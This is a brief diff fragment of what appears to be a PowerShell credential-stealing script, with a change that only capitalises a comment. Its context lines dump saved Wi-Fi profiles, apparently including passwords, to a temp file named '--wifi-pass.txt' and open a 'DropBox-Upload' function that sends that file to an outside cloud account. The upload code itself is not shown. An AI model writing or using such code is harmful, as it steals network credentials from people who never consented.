@@ -7,7 +7,7 @@ $wifiProfiles > $env:TEMP/--wifi-pass.txt
 
 ############################################################################################################################################################
 
-# Upload output file to dropbox
+# Upload output file to Dropbox
 
 function DropBox-Upload {
 
